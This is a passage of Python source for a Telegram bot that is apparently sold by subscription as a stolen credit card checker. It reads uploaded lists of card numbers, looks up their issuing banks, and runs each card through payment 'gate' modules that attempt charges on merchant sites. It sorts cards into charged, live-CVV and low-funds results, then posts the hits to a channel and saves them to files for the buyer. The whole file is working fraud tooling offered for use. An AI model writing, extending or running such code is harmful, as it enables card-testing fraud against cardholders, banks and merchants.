    text = f"{get_emj('💎')} <b>VIP SUBSCRIPTION PLANS</b> {get_emj('💎')}\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for plan, info in plans.items():
        text += f"➜ <b>{plan.replace('_', ' ').title()}:</b> ${info['price']} ({info['days']} Days)\n"
    text += "\n━━━━━━━━━━━━━━━━━━━━━━━━\n{get_emj('🤵')} <b>Contact @cyber_404io to Buy!</b>"
    bot.reply_to(message, text)

@bot.message_handler(commands=["addvip"])
def add_vip(message):
    if str(message.chat.id) != str(ADMIN_ID): 
        return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: <code>/addvip [user_id] [days]</code>")
        return
    
    target_id = args[1]
    try:
        days = int(args[2])
    except ValueError:
        bot.reply_to(message, "Days must be a number!")
        return
    
    users_data = load_users_data()
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
    
    if target_id not in users_data['allowed_users']:
        users_data['allowed_users'][target_id] = {}
    
    users_data['allowed_users'][target_id]['vip_expiry'] = expiry_str
    save_users_data(users_data)
    
    bot.reply_to(message, f"✅ User <code>{target_id}</code> added as VIP!\nExpiry: <code>{expiry_str}</code>")
    try: 
        bot.send_message(target_id, f"{get_emj('🎉')} <b>CONGRATS!</b>\nYour VIP status has been activated for {days} days.\nExpiry: {expiry_str}")
    except Exception as e:
        logger.warning(f"Could not notify user {target_id}: {e}")

@bot.message_handler(commands=["broadcast"])
def broadcast(message):
    if str(message.chat.id) != str(ADMIN_ID): 
        return
    msg_text = message.text.replace("/broadcast ", "")
    if not msg_text or msg_text == "/broadcast":
        bot.reply_to(message, "Usage: /broadcast [message]")
        return
    
    users_data = load_users_data()
    all_users = list(users_data['allowed_users'].keys())
    if str(ADMIN_ID) not in all_users: 
        all_users.append(str(ADMIN_ID))
    
    success = 0
    fail = 0
    for user_id in all_users:
        try:
            bot.send_message(user_id, f"{get_emj('📢')} <b>ADMIN BROADCAST:</b>\n\n{msg_text}")
            success += 1
            time.sleep(0.05)  # Rate limit protection
        except Exception as e:
            logger.warning(f"Broadcast failed to {user_id}: {e}")
            fail += 1
    
    bot.reply_to(message, f"✅ Broadcast sent!\nSuccess: {success}\nFailed: {fail}")

def send_to_channel(cc, last, gate_name, user_name, status_type="charged"):
    if status_type == "charged":
        emoji = get_emj('🐇')
        title = "CHARGED HIT"
    elif status_type == "cvv":
        emoji = get_emj('💎')
        title = "CVV LIVE"
    else:
        emoji = get_emj('💰')
        title = "LOW FUNDS"
    
    channel_msg = f"""
{title} {emoji}
━━━━━━━━━━━━━━━━━
Response ━ {last}
Gateway ━ {gate_name}
━━━━━━━━━━━━━━━━━
User ━ {user_name} (💎 PLATINUM USER)
"""
    try: 
        bot.send_message(CHANNEL_ID, channel_msg)
    except Exception as e:
        logger.error(f"Failed to send to channel: {e}")

def update_ui(message, stats):
    """Thread-safe UI update"""
    if stats.get('stop_event', False):
        return
    
    # Use lock to prevent concurrent edits
    if not hasattr(stats, '_ui_lock'):
        stats['_ui_lock'] = threading.Lock()
    
    with stats['_ui_lock']:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"✅ CHARGED: {stats['ch']}", callback_data='n'),
            types.InlineKeyboardButton(f"💳 CCN: {stats['ccn']}", callback_data='n'),
            types.InlineKeyboardButton(f"💎 CVV: {stats['cvv']}", callback_data='n'),
            types.InlineKeyboardButton(f"💰 LOW: {stats['low']}", callback_data='n'),
            types.InlineKeyboardButton(f"❌ DECLINED: {stats['dd']}", callback_data='n'),
            types.InlineKeyboardButton(f"📊 PROGRESS: {stats['checked']}/{stats['total']}", callback_data='n'),
            types.InlineKeyboardButton(f"🛑 STOP", callback_data='stop')
        )
        last_cc = stats.get('last_cc', 'N/A')
        last_gate = stats.get('last_gate', 'N/A')
        last_resp = stats.get('last_resp', 'Waiting...')
        text = f"""
{get_emj('🔄')} <b>FAST CHECKING IN PROGRESS...</b>
<b>━━━━━━━━━━━━━━</b>
{get_emj('💳')} <b>LAST CC:</b> <code>{last_cc}</code>
{get_emj('🎯')} <b>GATE:</b> <code>{last_gate}</code>
{get_emj('📝')} <b>RESP:</b> <code>{last_resp}</code>
<b>━━━━━━━━━━━━━━</b>
<b>BY: @cyber_404io</b>
"""
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=stats['msg_id'], text=text, reply_markup=markup)
        except Exception as e:
            # Ignore "message not modified" errors
            if "message is not modified" not in str(e).lower():
                logger.warning(f"UI update failed: {e}")

def save_result_to_file(user_id: int, cc: str, status_type: str, bank: str, country: str, gate_name: str):
    """Thread-safe file saving with per-user isolation"""
    user_dir = get_user_results_dir(user_id)
    if status_type == "hit":
        file_path = os.path.join(user_dir, "hit.txt")
    elif status_type == "low":
        file_path = os.path.join(user_dir, "low.txt")
    else:
        return
    
    file_lock = get_file_lock(file_path)
    with file_lock:
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            line = f"{cc}|{bank}|{country}|{gate_name}|{timestamp}\n"
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(line)
        except Exception as e:
            logger.error(f"File save error for user {user_id}: {e}")

def send_result_files(chat_id: int):
    """Send result files to user and clear them"""
    user_dir = get_user_results_dir(chat_id)
    hit_path = os.path.join(user_dir, "hit.txt")
    low_path = os.path.join(user_dir, "low.txt")
    
    try:
        if os.path.exists(hit_path) and os.path.getsize(hit_path) > 0:
            with open(hit_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"{get_emj('🔥')} <b>HIT RESULTS</b>")
            # Clear file after sending
            open(hit_path, 'w').close()
        
        if os.path.exists(low_path) and os.path.getsize(low_path) > 0:
            with open(low_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"{get_emj('💰')} <b>LOW FUND RESULTS</b>")
            open(low_path, 'w').close()
    except Exception as e:
        logger.error(f"Send file error for user {chat_id}: {e}")

def process_cc(cc, message, stats):
    """Thread-safe CC processing with locking"""
    if stats.get('stop_event', False):
        return
    
    cc = cc.strip()
    if not cc:
        return
    
    # Skip expired cards silently
    if is_card_expired(cc):
        # Thread-safe increment
        with stats.get('_counter_lock', threading.Lock()):
            stats['checked'] += 1
        return
    
    # Thread-safe last_cc update
    with stats.get('_state_lock', threading.Lock()):
        stats['last_cc'] = cc
    
    # Get BIN info with retry
    data = {}
    for retry in range(2):
        try:
            response = requests.get('https://bins.antipublic.cc/bins/' + cc[:6], timeout=5)
            if response.status_code == 200:
                data = response.json()
                break
        except Exception as e:
            logger.debug(f"BIN lookup failed for {cc[:6]}: {e}")
            time.sleep(0.5)
    
    country = data.get('country_name', 'Unknown')
    flag = data.get('country_flag', 'Unknown')
    bank = data.get('bank', 'Unknown')
    
    start_time = time.time()
    gate_name = "N/A"
    last = "Error"
    
    if GATE_MODULES:
        random_gate = random.choice(GATE_MODULES)
        gate_name = random_gate.__name__
        
        with stats.get('_state_lock', threading.Lock()):
            stats['last_gate'] = gate_name
        
        try:
            last_raw = str(random_gate.Tele(cc))
            if '"message":' in last_raw:
                try:
                    last = json.loads(last_raw)['error'].get('message', last_raw)
                except:
                    last = last_raw
            else:
                last = last_raw if last_raw != "0" else "Site Rejected"
        except Exception as e:
            logger.error(f"Gateway error for {gate_name}: {e}")
            last = "Gateway Error"
    
    with stats.get('_state_lock', threading.Lock()):
        stats['last_resp'] = last
    
    execution_time = time.time() - start_time
    last_lower = last.lower()
    
    is_hit = False
    is_low = False
    is_3ds = False
    
    hit_k = ['thank', 'success":true', 'thank-you', 'successful', 'Successful!', 'confirmed', 'paid', 'transaction_id']
    low_k = ['insufficient funds', 'low funds', 'money', 'balance']
    three_k = ['additional action', 'authenticate', '3d_secure', 'verification required', 'challenge_required', 'initstripescamodal', 'client_secret', 'strong customer authentication']
    
    if any(k in last_lower for k in three_k):
        is_3ds = True
        last = "3D Authentication Required"
    elif any(k in last_lower for k in hit_k) and '"success":false' not in last_lower and 'error' not in last_lower:
        is_hit = True
        last = "Transaction Successful" if "success" in last_lower else last
    elif any(k in last_lower for k in low_k):
        is_low = True
        last = "Insufficient Funds"
    
    user_fname = message.from_user.first_name
    user_uname = f"@{message.from_user.username}" if message.from_user.username else "No Username"
    user_display = f"{user_fname} ({user_uname})"
    
    hit_msg = f"""
<b>{get_emj('🔥')} HIT FOUND! {get_emj('🔥')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{get_emj('💳')} CARD     {get_emj('➡️')}</b> <code>{cc}</code>
<b>{get_emj('📝')} STATUS   {get_emj('➡️')}</b> <code>{last}</code>
<b>{get_emj('🏦')} BANK     {get_emj('➡️')}</b> <code>{bank}</code>
<b>{get_emj('🌍')} COUNTRY  {get_emj('➡️')}</b> <code>{country} {flag}</code>
<b>{get_emj('⚙️')} GATE     {get_emj('➡️')}</b> <code>{gate_name}</code>
<b>{get_emj('⏳')} TIME     {get_emj('➡️')}</b> <code>{execution_time:.1f}s</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{get_emj('👨‍💻')} BY       {get_emj('➡️')}</b> <a href="https://t.me/cyber_404io">@cyber_404io</a>
"""
    
    # Thread-safe counter updates
    with stats.get('_counter_lock', threading.Lock()):
        if is_hit:
            stats['ch'] += 1
            # Send message outside lock to avoid deadlock
            bot.reply_to(message, hit_msg)
            send_to_channel(cc, last, gate_name, user_display, "charged")
            save_result_to_file(message.chat.id, cc, "hit", bank, country, gate_name)
        elif is_low:
            stats['low'] += 1
            bot.reply_to(message, hit_msg.replace("HIT FOUND", "LOW FUNDS").replace(get_emj('🔥'), get_emj('💰')))
            send_to_channel(cc, last, gate_name, user_display, "low")
            save_result_to_file(message.chat.id, cc, "low", bank, country, gate_name)
        elif is_3ds:
            stats['cvv'] += 1
            bot.reply_to(message, hit_msg.replace("HIT FOUND", "CVV LIVE").replace(get_emj('🔥'), get_emj('💎')))
            send_to_channel(cc, last, gate_name, user_display, "cvv")
        elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower:
            stats['ccn'] += 1
        elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower:
            stats['cvv'] += 1
        else:
            stats['dd'] += 1
        
        stats['checked'] += 1
    
    # Update UI periodically
    if stats['checked'] % 3 == 0 or stats['checked'] == stats['total']:
        update_ui(message, stats)

@bot.message_handler(content_types=["document"])
def handle_docs(message):
    if not is_user_allowed(message.chat.id):
        bot.reply_to(message, f"{get_emj('❌')} Buy VIP first!")
        return
    
    # Validate file size (max 10MB)
    if message.document.file_size > 10 * 1024 * 1024:
        bot.reply_to(message, f"{get_emj('❌')} File too large! Max 10MB.")
        return
    
    # Validate file extension
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, f"{get_emj('❌')} Only .txt files are supported!")
        return
    
    ko = bot.reply_to(message, f"{get_emj('⏳')} <b>STARTING FAST CHECKER...</b>").message_id
    
    # Download file with timeout
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
    except Exception as e:
        logger.error(f"File download failed: {e}")
        bot.edit_message_text(f"{get_emj('❌')} Failed to download file!", chat_id=message.chat.id, message_id=ko)
        return
    
    path = f"combo_{message.chat.id}_{hashlib.md5(downloaded).hexdigest()[:8]}.txt"
    try:
        with open(path, "wb") as f:
            f.write(downloaded)
        
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lino = [l.strip() for l in f.readlines() if l.strip()]
        
        if not lino:
            bot.edit_message_text(f"{get_emj('❌')} Empty file!", chat_id=message.chat.id, message_id=ko)
            os.remove(path)
            return
        
        # Create stats with locks
        stats = {
            'ch': 0, 'ccn': 0, 'cvv': 0, 'low': 0, 'dd': 0,
            'checked': 0, 'total': len(lino), 'msg_id': ko,
            'stop_event': False, 'last_cc': 'N/A', 'last_gate': 'N/A', 'last_resp': 'Waiting...',
            '_counter_lock': threading.Lock(),
            '_state_lock': threading.Lock(),
            '_ui_lock': threading.Lock()
        }
        
        # Thread-safe addition to active_checks
        with active_checks_lock:
            active_checks[message.chat.id] = stats
        
        update_ui(message, stats)
        
        # Use ThreadPoolExecutor with proper shutdown
        executor = ThreadPoolExecutor(max_workers=5)
        futures = []
        
        try:
            for cc in lino:
                if stats['stop_event']:
                    break
                future = executor.submit(process_cc, cc, message, stats)
                futures.append(future)
                time.sleep(0.03)  # Reduced sleep for better performance
            
            # Wait for completion with timeout
            for future in futures:
                try:
                    future.result(timeout=2)
                except Exception as e:
                    logger.debug(f"Task execution error: {e}")
        finally:
            executor.shutdown(wait=True, cancel_futures=False)
        
        # Clean up
        with active_checks_lock:
            active_checks.pop(message.chat.id, None)
        
        final_text = f"{get_emj('🛑')} <b>STOPPED BY USER</b>" if stats['stop_event'] else f"{get_emj('✅')} <b>FAST CHECKING COMPLETED!</b>"
        final_markup = types.InlineKeyboardMarkup(row_width=1)
        final_markup.add(
            types.InlineKeyboardButton(f"✅ {stats['ch']}", callback_data='n'),
            types.InlineKeyboardButton(f"💳 {stats['ccn']}", callback_data='n'),
            types.InlineKeyboardButton(f"💎 {stats['cvv']}", callback_data='n'),
            types.InlineKeyboardButton(f"💰 {stats['low']}", callback_data='n'),
            types.InlineKeyboardButton(f"❌ {stats['dd']}", callback_data='n')
        )
        
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=final_text, reply_markup=final_markup)
        except Exception as e:
            logger.warning(f"Final message edit failed: {e}")
        
        # Send result files
        send_result_files(message.chat.id)
        
    except Exception as e:
        logger.error(f"Error in handle_docs: {e}", exc_info=True)
        bot.edit_message_text(f"{get_emj('❌')} Error: {str(e)[:200]}", chat_id=message.chat.id, message_id=ko)
    finally:
        if os.path.exists(path):
            os.remove(path)

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_cb(call):
    user_id = call.message.chat.id
    with active_checks_lock:
        if user_id in active_checks:
            active_checks[user_id]['stop_event'] = True
            bot.answer_callback_query(call.id, "🛑 Stopping immediately...")
        else:
            bot.answer_callback_query(call.id, "❌ No active session.")

@bot.callback_query_handler(func=lambda call: call.data == 'n')
def noop_cb(call):
    bot.answer_callback_query(call.id)

if __name__ == "__main__":
    # Remove webhook and start polling with error recovery
    try:
        bot.delete_webhook()
        logger.info("Fast Bot is running - EXPIRED cards are SILENTLY SKIPPED (no message, no count)")
        logger.info(f"Loaded {len(GATE_MODULES)} gate modules")
        
        # Start bot with error recovery
        while True:
            try:
                bot.infinity_polling(timeout=60, long_polling_timeout=60)
            except Exception as e:
                logger.error(f"Polling error: {e}", exc_info=True)
                time.sleep(5)
                continue
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
